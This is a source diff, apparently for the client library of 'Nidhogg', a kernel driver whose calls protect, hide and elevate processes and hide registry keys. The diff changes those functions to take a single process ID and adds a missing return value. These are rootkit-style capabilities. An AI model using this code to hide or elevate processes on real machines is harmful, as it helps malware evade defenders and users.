@@ -164,7 +164,7 @@ std::wstring ParseRegistryKey(wchar_t* key) {
     return result;
 }
 
-int NidhoggProcessProtect(std::vector<DWORD> pids) {
+int NidhoggProcessProtect(DWORD pid) {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -172,7 +172,7 @@ int NidhoggProcessProtect(std::vector<DWORD> pids) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_PROTECT_PROCESS,
-        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
+        &pid, sizeof(pid),
         nullptr, 0, &returned, nullptr)) {
         CloseHandle(hFile);
         return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -182,7 +182,7 @@ int NidhoggProcessProtect(std::vector<DWORD> pids) {
     return NIDHOGG_SUCCESS;
 }
 
-int NidhoggProcessUnprotect(std::vector<DWORD> pids) {
+int NidhoggProcessUnprotect(DWORD pid) {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -190,7 +190,7 @@ int NidhoggProcessUnprotect(std::vector<DWORD> pids) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_UNPROTECT_PROCESS,
-        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
+        &pid, sizeof(pid),
         nullptr, 0, &returned, nullptr)) {
 
         CloseHandle(hFile);
@@ -218,7 +218,7 @@ int NidhoggProcessClearAllProtection() {
     return NIDHOGG_SUCCESS;
 }
 
-int NidhoggProcessHide(std::vector<DWORD> pids) {
+int NidhoggProcessHide(DWORD pid) {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -226,7 +226,7 @@ int NidhoggProcessHide(std::vector<DWORD> pids) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_HIDE_PROCESS,
-        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
+        &pid, sizeof(pid),
         nullptr, 0, &returned, nullptr)) {
 
         CloseHandle(hFile);
@@ -237,7 +237,7 @@ int NidhoggProcessHide(std::vector<DWORD> pids) {
     return NIDHOGG_SUCCESS;
 }
 
-int NidhoggProcessElevate(std::vector<DWORD> pids) {
+int NidhoggProcessElevate(DWORD pid) {
     DWORD returned;
     HANDLE hFile = CreateFile(DRIVER_NAME, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 
@@ -245,7 +245,7 @@ int NidhoggProcessElevate(std::vector<DWORD> pids) {
         return NIDHOGG_ERROR_CONNECT_DRIVER;
 
     if (!DeviceIoControl(hFile, IOCTL_NIDHOGG_ELEVATE_PROCESS,
-        pids.data(), static_cast<DWORD>(pids.size()) * sizeof(DWORD),
+        &pid, sizeof(pid),
         nullptr, 0, &returned, nullptr)) {
 
         CloseHandle(hFile);
@@ -568,6 +568,8 @@ int NidhoggRegistryUnhideKey(wchar_t* key) {
         CloseHandle(hFile);
         return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
     }
+
+    return NIDHOGG_SUCCESS;
 }
 
 int NidhoggRegistryUnprotectValue(wchar_t* key, wchar_t* valueName) {
